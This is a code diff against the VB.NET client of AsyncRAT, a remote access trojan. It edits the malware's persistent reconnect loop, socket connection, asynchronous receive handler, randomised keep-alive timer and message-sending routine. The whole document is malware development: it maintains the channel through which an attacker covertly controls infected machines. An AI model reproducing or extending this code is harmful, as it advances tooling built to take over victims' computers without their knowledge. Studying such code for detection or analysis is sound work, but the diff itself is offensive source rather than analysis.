@@ -88,7 +88,7 @@ Namespace AsyncRAT
 
 
             While True
-                Thread.Sleep(New Random().Next(1000, 6 * 1000))
+                Thread.Sleep(New Random().Next(1000, 6000))
                 If isConnected = False Then
                     isDisconnected()
                     Connect()
@@ -128,7 +128,6 @@ Namespace AsyncRAT
         Public Shared Sub Connect()
 
             Try
-
                 S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
                 BufferLength = 0
@@ -148,7 +147,7 @@ Namespace AsyncRAT
                 S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
 
                 Dim T As New TimerCallback(AddressOf Ping)
-                Tick = New Threading.Timer(T, Nothing, New Random().Next(30 * 1000, 60 * 1000), New Random().Next(30 * 1000, 60 * 1000))
+                Tick = New Threading.Timer(T, Nothing, New Random().Next(30000, 60000), New Random().Next(30000, 60000))
             Catch ex As Exception
                 Debug.WriteLine("Connect : Failed")
                 isConnected = False
@@ -164,11 +163,12 @@ Namespace AsyncRAT
         End Sub
 
         Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
-            If isConnected = False OrElse Not S.Connected Then
+            If S.Connected = False Then
                 Debug.WriteLine("BeginReceive : Disconnected")
                 isConnected = False
                 Exit Sub
             End If
+
             Try
                 Dim Received As Integer = S.EndReceive(ar)
                 If Received > 0 Then
@@ -208,17 +208,15 @@ Namespace AsyncRAT
                 Else
                     Debug.WriteLine("BeginReceive : Disconnected")
                     isConnected = False
-                    Exit Sub
                 End If
             Catch ex As Exception
                 Debug.WriteLine("BeginReceive : Failed")
                 isConnected = False
-                Exit Sub
             End Try
         End Sub
 
         Public Shared Sub Send(ParamArray Msgs As Object())
-            If isConnected = True OrElse S.Connected Then
+            If isConnected = True Then
                 Try
                     Dim Packer As New Pack
                     Dim Data As Byte() = Packer.Serialize(Msgs)
@@ -237,8 +235,6 @@ Namespace AsyncRAT
                     Debug.WriteLine("Send : Failed")
                     isConnected = False
                 End Try
-            Else
-                isConnected = False
             End If
         End Sub
 
@@ -281,7 +277,6 @@ Namespace AsyncRAT
                     Debug.WriteLine("S.Dispose")
                 End Try
             End If
-
 
         End Sub
 
